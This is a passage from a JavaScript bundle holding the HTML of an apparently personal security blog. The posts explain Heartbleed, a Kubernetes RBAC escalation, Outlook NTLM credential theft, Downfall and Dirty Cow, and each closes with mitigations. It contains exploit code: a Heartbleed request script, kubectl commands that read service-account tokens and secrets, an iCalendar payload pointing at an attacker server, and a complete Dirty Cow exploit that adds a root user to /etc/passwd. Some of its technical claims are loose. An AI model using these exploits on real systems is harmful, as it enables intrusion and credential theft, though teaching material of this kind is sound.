&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Hg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Vg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Wg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,$g=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Gg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Yg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
